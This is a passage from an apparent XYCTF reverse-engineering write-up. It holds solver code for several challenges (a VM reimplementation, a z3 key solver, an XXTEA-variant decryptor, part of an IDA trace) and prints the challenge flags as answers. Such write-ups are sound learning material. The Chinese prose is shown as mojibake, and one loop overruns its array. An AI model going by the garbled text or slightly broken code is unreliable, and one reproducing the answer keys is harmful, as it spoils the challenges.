class="line">code[<span class="number">194</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">195</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">196</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">197</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">198</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">199</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">200</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">201</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">202</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">203</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">204</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">205</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">206</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">207</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">208</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">209</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">210</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">211</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">212</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">213</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">214</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">215</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">216</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">217</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">218</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">219</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">220</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">221</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">222</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">223</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">224</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">225</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">226</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">227</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">228</span>] = <span class="number">1</span>;<span class="comment">//input[5]å‡42</span></span><br><span class="line">code[<span class="number">229</span>] = <span class="number">2</span>;<span class="comment">//input[6]</span></span><br><span class="line">code[<span class="number">232</span>] = <span class="number">2</span>;<span class="comment">//input[6]+=2,i,j+1</span></span><br><span class="line">code[<span class="number">256</span>] = <span class="number">2</span>;<span class="comment">//input[7]+=23,i,j+1</span></span><br><span class="line">code[<span class="number">257</span>] = <span class="number">5</span>;<span class="comment">//input[8]-åä¸€ä½+70</span></span><br><span class="line">code[<span class="number">303</span>] = <span class="number">1</span>;<span class="comment">//input[8]+45</span></span><br><span class="line">code[<span class="number">304</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">305</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">306</span>] = <span class="number">1</span>;<span class="comment">//input[8]-4</span></span><br><span class="line">code[<span class="number">307</span>] = <span class="number">2</span>;<span class="comment">//i,j+1</span></span><br><span class="line">code[<span class="number">308</span>] = <span class="number">5</span>;<span class="comment">//input[9]-åä¸€ä½+70</span></span><br><span class="line">code[<span class="number">328</span>] = <span class="number">1</span>;<span class="comment">//input[9]+19</span></span><br><span class="line">code[<span class="number">329</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">330</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">331</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">332</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">333</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">334</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">335</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">336</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">337</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">338</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">339</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">340</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">341</span>] = <span class="number">1</span>;<span class="comment">//input[9]-14</span></span><br><span class="line">code[<span class="number">342</span>] = <span class="number">2</span>;<span class="comment">//input[10]</span></span><br><span class="line">code[<span class="number">353</span>] = <span class="number">2</span>;<span class="comment">//input[10]+10,input[11]</span></span><br><span class="line">code[<span class="number">354</span>] = <span class="number">5</span>;<span class="comment">//input[11]-åä¸€ä½+70</span></span><br><span class="line">code[<span class="number">430</span>] = <span class="number">2</span>;<span class="comment">//input[11]+75,input[12]</span></span><br><span class="line">code[<span class="number">431</span>] = <span class="number">2</span>;<span class="comment">//input[13]</span></span><br><span class="line">code[<span class="number">432</span>] = <span class="number">5</span>;<span class="comment">//input[13]-åä¸€ä½+70</span></span><br><span class="line">code[<span class="number">523</span>] = <span class="number">2</span>;<span class="comment">//input[13]+90,input[14]</span></span><br><span class="line">code[<span class="number">524</span>] = <span class="number">5</span>;<span class="comment">//input[14]-åä¸€ä½+70</span></span><br><span class="line">code[<span class="number">564</span>] = <span class="number">2</span>;<span class="comment">//input[14]+=39,input[15]</span></span><br><span class="line">code[<span class="number">565</span>] = <span class="number">5</span>;<span class="comment">//input[15]-åä¸€ä½+70</span></span><br><span class="line">code[<span class="number">627</span>] = <span class="number">2</span>;<span class="comment">//input[15]+=61,input[16]</span></span><br><span class="line">code[<span class="number">628</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">629</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">630</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">631</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">632</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">633</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">634</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">635</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">636</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">637</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">638</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">639</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">640</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">641</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">642</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">643</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">644</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">645</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">646</span>] = <span class="number">1</span>;<span class="comment">//input[16]-=19</span></span><br><span class="line">code[<span class="number">647</span>] = <span class="number">2</span>;<span class="comment">//input[17]</span></span><br><span class="line">code[<span class="number">648</span>] = <span class="number">4</span>;<span class="comment">//input[17]+åä¸€ä½-70</span></span><br><span class="line">code[<span class="number">649</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">650</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">651</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">652</span>] = <span class="number">1</span>;<span class="comment">//input[17]-4</span></span><br><span class="line">code[<span class="number">653</span>] = <span class="number">2</span>;<span class="comment">//input[18]</span></span><br><span class="line">code[<span class="number">680</span>] = <span class="number">2</span>;<span class="comment">//input[18]+26,input[19]</span></span><br><span class="line">code[<span class="number">687</span>] = <span class="number">2</span>;<span class="comment">//input[19]+6,input[20]</span></span><br><span class="line">code[<span class="number">688</span>] = <span class="number">4</span>;<span class="comment">//input[20]+åä¸€ä½-70</span></span><br><span class="line">code[<span class="number">698</span>] = <span class="number">2</span>;<span class="comment">//input[20]+9,input[21]</span></span><br><span class="line">code[<span class="number">766</span>] = <span class="number">2</span>;<span class="comment">//input[21]+67,input[22]</span></span><br><span class="line">code[<span class="number">767</span>] = <span class="number">5</span>;<span class="comment">//input[22]-åä¸€ä½+70</span></span><br><span class="line">code[<span class="number">818</span>] = <span class="number">2</span>;<span class="comment">//input[22]+50,input[23]</span></span><br><span class="line">code[<span class="number">819</span>] = <span class="number">1</span>;<span class="comment">//input[23]-1</span></span><br><span class="line">code[<span class="number">820</span>] = <span class="number">2</span>;<span class="comment">//input[24]</span></span><br><span class="line">code[<span class="number">827</span>] = <span class="number">2</span>;<span class="comment">//input[24]+6,input[25]</span></span><br><span class="line">code[<span class="number">828</span>] = <span class="number">5</span>;<span class="comment">//input[25]-åä¸€ä½+70</span></span><br><span class="line">code[<span class="number">846</span>] = <span class="number">2</span>;<span class="comment">//input[25]+17,input[26]</span></span><br><span class="line">code[<span class="number">847</span>] = <span class="number">5</span>;<span class="comment">//input[26]-åä¸€ä½+70</span></span><br><span class="line">code[<span class="number">890</span>] = <span class="number">2</span>;<span class="comment">//input[26]+42,input[27]</span></span><br><span class="line">code[<span class="number">891</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">892</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">893</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">894</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">895</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">896</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">897</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">898</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">899</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">900</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">901</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">902</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">903</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">904</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">905</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">906</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">907</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">908</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">909</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">910</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">911</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">912</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">913</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">914</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">915</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">916</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">917</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">918</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">919</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">920</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">921</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">922</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">923</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">924</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">925</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">926</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">927</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">928</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">929</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">930</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">931</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">932</span>] = <span class="number">1</span>;<span class="comment">//input[27]-42</span></span><br><span class="line">code[<span class="number">933</span>] = <span class="number">2</span>;<span class="comment">//input[28]</span></span><br><span class="line">code[<span class="number">934</span>] = <span class="number">5</span>;<span class="comment">//input[28]-åä¸€ä½+70</span></span><br><span class="line">code[<span class="number">989</span>] = <span class="number">2</span>;<span class="comment">//input[28]-54,input[29]</span></span><br><span class="line">code[<span class="number">994</span>] = <span class="number">2</span>;<span class="comment">//input[29]+3,input[30]</span></span><br><span class="line">code[<span class="number">995</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">996</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">997</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">998</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">999</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1000</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1001</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1002</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1003</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1013</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1014</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1015</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1016</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1017</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1018</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1019</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1020</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1021</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1022</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1023</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1024</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1025</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1026</span>] = <span class="number">1</span>;<span class="comment">//input[30]-23</span></span><br><span class="line">code[<span class="number">1027</span>] = <span class="number">2</span>;<span class="comment">//input[31]</span></span><br><span class="line">code[<span class="number">1028</span>] = <span class="number">3</span>;</span><br><span class="line">i = <span class="number">31</span>;</span><br><span class="line">j = <span class="number">1027</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (j &lt;= <span class="number">-1</span> || i &lt;= <span class="number">-1</span>) &#123; <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">while</span> (code[j] == <span class="number">0</span>) &#123;<span class="comment">//code=0</span></span><br><span class="line">--j;</span><br><span class="line">--input[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (code[j] == <span class="number">1</span>) &#123;</span><br><span class="line">--j;</span><br><span class="line">++input[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (code[j] == <span class="number">2</span>) &#123;<span class="comment">//é€’å¢ä½</span></span><br><span class="line">--j;</span><br><span class="line">--i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (code[j] == <span class="number">3</span>)<span class="comment">//ç»“æŸæ ‡å¿—</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (code[j] == <span class="number">4</span>) &#123;</span><br><span class="line">input[i] = input[i] - input[i + <span class="number">1</span>] + <span class="number">70</span>;</span><br><span class="line">--j;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (code[j] == <span class="number">5</span>) &#123;</span><br><span class="line">input[i] = input[i] + input[i + <span class="number">1</span>] - <span class="number">70</span>;</span><br><span class="line">--j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> input[<span class="number">32</span>] = &#123; <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">118</span>, <span class="number">101</span>, <span class="number">95</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">110</span>, <span class="number">111</span>, <span class="number">116</span>, <span class="number">95</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">95</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">100</span>, <span class="number">95</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">118</span>, <span class="number">101</span>, <span class="number">125</span> &#125;;</span><br><span class="line">processCode(input);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(input); i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>, input[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="comment">//&quot;FLAG&#123;vm_is_A_3ecreT_l0Ve_revers&#125;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»“æœç›´æ¥å°±å‡ºäº†</p><h4 id="èˆ”ç‹—å››éƒ¨æ›²â€“ç›¸é€¢å·²æ˜¯ä¸Šä¸Šç­¾">èˆ”ç‹—å››éƒ¨æ›²â€“ç›¸é€¢å·²æ˜¯ä¸Šä¸Šç­¾</h4><p>å…ˆç”¨010edtioræŠŠæŒ‡å‘peå¤´çš„åç§»ä¿®å¥½ï¼Œæ”¹æˆ0001ã€‚ç„¶åè¿›å»ç”¨z3æŠŠkeyæ±‚å‡ºæ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">key,out = zini(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">s.add(<span class="number">532</span> * key[<span class="number">5</span>] + <span class="number">829</span> * key[<span class="number">4</span>] + <span class="number">258</span> * key[<span class="number">3</span>] + <span class="number">811</span> * key[<span class="number">2</span>] + <span class="number">997</span> * key[<span class="number">1</span>] + <span class="number">593</span> * key[<span class="number">0</span>] == <span class="number">292512</span>)</span><br><span class="line">s.add(<span class="number">576</span> * key[<span class="number">5</span>] + <span class="number">695</span> * key[<span class="number">4</span>] + <span class="number">602</span> * key[<span class="number">3</span>] + <span class="number">328</span> * key[<span class="number">2</span>] + <span class="number">686</span> * key[<span class="number">1</span>] + <span class="number">605</span> * key[<span class="number">0</span>] == <span class="number">254496</span>)</span><br><span class="line">s.add(<span class="number">580</span> * key[<span class="number">5</span>] + <span class="number">448</span> * key[<span class="number">4</span>] + <span class="number">756</span> * key[<span class="number">3</span>] + <span class="number">449</span> * key[<span class="number">2</span>] + (key[<span class="number">1</span>] &lt;&lt; <span class="number">9</span>) + <span class="number">373</span> * key[<span class="number">0</span>] == <span class="number">222479</span>)</span><br><span class="line">s.add(<span class="number">597</span> * key[<span class="number">5</span>] + <span class="number">855</span> * key[<span class="number">4</span>] + <span class="number">971</span> * key[<span class="number">3</span>] + <span class="number">422</span> * key[<span class="number">2</span>] + <span class="number">635</span> * key[<span class="number">1</span>] + <span class="number">560</span> * key[<span class="number">0</span>] == <span class="number">295184</span>)</span><br><span class="line">s.add(<span class="number">524</span> * key[<span class="number">5</span>] + <span class="number">324</span> * key[<span class="number">4</span>] + <span class="number">925</span> * key[<span class="number">3</span>] + <span class="number">388</span> * key[<span class="number">2</span>] + <span class="number">507</span> * key[<span class="number">1</span>] + <span class="number">717</span> * key[<span class="number">0</span>] == <span class="number">251887</span>)</span><br><span class="line">s.add(<span class="number">414</span> * key[<span class="number">5</span>] + <span class="number">495</span> * key[<span class="number">4</span>] + <span class="number">518</span> * key[<span class="number">3</span>] + <span class="number">884</span> * key[<span class="number">2</span>] + <span class="number">368</span> * key[<span class="number">1</span>] + <span class="number">312</span> * key[<span class="number">0</span>] == <span class="number">211260</span>)</span><br><span class="line"></span><br><span class="line">zcheck(s,key)</span><br><span class="line"><span class="comment"># XYCTF!</span></span><br></pre></td></tr></table></figure><p>ç„¶ååé¢æ˜¯ä¸€ä¸ªé­”æ”¹teaï¼Œç›´æ¥è§£</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">dec2</span><span class="params">(DWORD* flag, <span class="type">int</span> len_after)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line"><span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"><span class="type">int</span> v4; <span class="comment">// edx</span></span><br><span class="line"><span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"><span class="type">int</span> mid; <span class="comment">// [esp+4h] [ebp-1Ch]</span></span><br><span class="line"><span class="type">int</span> round; <span class="comment">// [esp+Ch] [ebp-14h]</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> sum; <span class="comment">// [esp+10h] [ebp-10h]</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flag_last; <span class="comment">// [esp+18h] [ebp-8h]</span></span><br><span class="line"><span class="type">int</span> i; <span class="comment">// [esp+1Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (len_after &gt; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">round = <span class="number">52</span> / len_after + <span class="number">6</span>;</span><br><span class="line">sum = <span class="number">0</span>;</span><br><span class="line">sum -= round * <span class="number">0x61C88647</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = len_after - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line">flag[i] -= ((flag[(i + <span class="number">7</span>) % <span class="number">8</span>] ^ key[(((sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">5</span>) ^ i) &amp; <span class="number">5</span>]) + (flag[(i + <span class="number">1</span>) % <span class="number">8</span>] ^ sum)) ^ (((<span class="number">16</span> * flag[(i + <span class="number">7</span>) % <span class="number">8</span>]) ^ (flag[(i + <span class="number">1</span>) % <span class="number">8</span>] &gt;&gt; <span class="number">3</span>)) + ((<span class="number">4</span> * flag[(i + <span class="number">1</span>) % <span class="number">8</span>]) ^ (flag[(i + <span class="number">7</span>) % <span class="number">8</span>] &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">&#125;</span><br><span class="line">sum += <span class="number">0x61C88647</span>;</span><br><span class="line">--round;</span><br><span class="line">&#125; <span class="keyword">while</span> (round);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> last[<span class="number">32</span>] = &#123;</span><br><span class="line"><span class="number">0x71</span>, <span class="number">0x72</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x85</span>, <span class="number">0x22</span>, <span class="number">0x6E</span>, <span class="number">0x89</span>, <span class="number">0x1B</span>, <span class="number">0x8C</span>, <span class="number">0x18</span>, <span class="number">0xC5</span>, <span class="number">0x03</span>, <span class="number">0xFD</span>, <span class="number">0xBC</span>, <span class="number">0x72</span>,</span><br><span class="line"><span class="number">0xCA</span>, <span class="number">0x11</span>, <span class="number">0x80</span>, <span class="number">0x53</span>, <span class="number">0xAC</span>, <span class="number">0x46</span>, <span class="number">0xA1</span>, <span class="number">0x4D</span>, <span class="number">0x6B</span>, <span class="number">0x0D</span>, <span class="number">0x63</span>, <span class="number">0x86</span>, <span class="number">0xF0</span>, <span class="number">0x97</span>, <span class="number">0x97</span>, <span class="number">0xF8</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">dec2</span>((DWORD*)last, <span class="number">8</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; hex &lt;&lt; (last[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// XYCTF&#123;XXTEA_AND_Z3_1s_S0_easy!!&#125;</span></span><br></pre></td></tr></table></figure><h4 id="èˆ”ç‹—å››éƒ¨æ›²â€“è®°å¿†çš„æ—¶å…‰æœº">èˆ”ç‹—å››éƒ¨æ›²â€“è®°å¿†çš„æ—¶å…‰æœº</h4><p>ç¬¬ä¸€æ¬¡é‡åˆ°è¿™ç§jmp+å¯„å­˜å™¨çš„å€¼ï¼Œä¸è¿‡é€šè¿‡åˆ†æå¯ä»¥çœ‹å‡ºå‡ä¸ºé¡ºåºè·³è½¬ï¼Œç›´æ¥tranceï¼Œç„¶ååˆ†æï¼Œå¤§æ¦‚å¾—å‡ºåŠ å¯†é€»è¾‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">0000E808.text:enc+4sub     rsp, 48hRSP=00007FFCB17CE120 CF=0 PF=0 SF=0</span><br><span class="line">0000E808.text:enc+8lea     rcx, sub_558B201D1460RCX=0000558B201D1460</span><br><span class="line">0000E808.text:enc+Fmov     edx, 2RDX=0000000000000002</span><br><span class="line">0000E808.text:enc+14movsxd  r10, esiR10=0000000000000001</span><br><span class="line">0000E808.text:enc+17mov     rax, fs:28hRAX=374B368125068200</span><br><span class="line">0000E808.text:enc+20mov     [rsp+48h+var_10], rax</span><br><span class="line">0000E808.text:enc+25xor     eax, eaxRAX=0000000000000000 PF=1 ZF=1</span><br><span class="line">0000E808.text:enc+27lea     rax, sub_558B201D1448RAX=0000558B201D1448</span><br><span class="line">0000E808.text:enc+2Emov     [rsp+48h+var_48], rcx</span><br><span class="line">0000E808.text:enc+32add     esi, 6RSI=0000000000000007 PF=0 ZF=0</span><br><span class="line">0000E808.text:enc+35mov     [rsp+48h+var_40], rax</span><br><span class="line">0000E808.text:enc+3Alea     rax, sub_558B201D1430RAX=0000558B201D1430</span><br><span class="line">0000E808.text:enc+41lea     r11, key; \&quot;i_have_get_shell_but_where_is_you_my_de\&quot;...</span><br><span class="line">0000E808.text:enc+48mov     [rsp+48h+var_38], rax</span><br><span class="line">0000E808.text:enc+4Dlea     rax, sub_558B201D1418RAX=0000558B201D1418</span><br><span class="line">0000E808.text:enc+54mov     [rsp+48h+var_30], rax</span><br><span class="line">0000E808.text:enc+59lea     rax, 